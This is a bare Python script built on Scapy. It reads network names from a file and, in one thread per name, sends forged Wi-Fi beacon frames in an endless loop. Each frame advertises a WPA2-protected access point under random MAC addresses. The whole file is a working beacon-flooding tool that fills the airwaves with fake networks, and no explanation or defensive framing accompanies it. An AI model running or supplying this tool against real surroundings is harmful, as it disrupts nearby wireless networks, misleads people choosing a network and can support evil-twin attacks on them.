from scapy.all import Dot11,Dot11Beacon,Dot11Elt,RadioTap,sendp,hexdump,RandMAC
from threading import Thread
import argparse

def flood(iface, netSSID):
  dot11 = Dot11(type=0, subtype=8, addr1 = 'ff:ff:ff:ff:ff:ff', addr2=str(RandMAC()), addr3=str(RandMAC()))
  beacon = Dot11Beacon(cap='ESS+privacy')
  essid = Dot11Elt(ID='SSID', info=netSSID, len=len(netSSID))

  rsn = Dot11Elt(ID='RSNinfo', info=(
  '\x01\x00'
  '\x00\x0f\xac\x02'
  '\x02\x00'
  '\x00\x0f\xac\x04'
  '\x00\x0f\xac\x02'
  '\x01\x00'
  '\x00\x0f\xac\x02'
  '\x00\x00'))

  frame = RadioTap()/dot11/beacon/essid/rsn

  sendp(frame, iface=iface, inter=0.0100 , loop=1)
  
def main(iface):
  with open("./ssid-list.txt","r") as f:
    threads = []
    while True:
      ssid = f.readline()
      if not ssid: break
      t = Thread(target=flood, args=(iface, ssid))
      t.start()
      threads.append(t)
    f.close()
    for thread in threads:
      thread.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('arg1')
    args = parser.parse_args()    
    main(args.arg1)